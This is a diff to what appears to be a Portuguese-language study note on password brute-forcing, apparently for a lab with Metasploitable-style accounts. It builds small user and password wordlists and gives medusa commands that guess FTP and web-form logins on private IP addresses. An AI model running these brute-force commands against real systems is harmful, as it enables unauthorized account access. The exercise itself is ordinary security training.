@@ -12,5 +12,19 @@ medusa 192.168.10.105 -U users.txt -P pass.txt -M ftp -t 6 # comando que tenta l
 # der certo aparecerá successful use o ultimo parametro para tentar logae de forma manual.
 
 # Ataque de força bruta em formulário de ligin web
-# Fn F12  # na página para abrir o modo desenvolvedor (inpecionar elementos) ao clicar em network erá possivel vê 
-o que é enviado e recebido
+# Fn F12  # na página para abrir o modo desenvolvedor (inspecionar elementos) ao clicar em network erá possivel vê 
+#o que é enviado e recebido
+
+
+# Criando Wordlist
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+echo -e "123456\npassword\nqwerty\nmsfadmin" > pass.txt
+echo -e "user\nmsfadmin\nadmin\nroot" > users.txt
+# O comando a seguir é o que de fato vai tentar invadir um site usando as word list criada
+# verificando combinações de usuários e senhas para identificar possíveis credenciais válidas no servidor.
+
+medusa -h 192.168.0.105 -U users.txt -P pass.txt -M http \
+-m PAGE:'/xxxx/login.php'
+-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
+-m 'FAIL=Login failed' -t 6
+
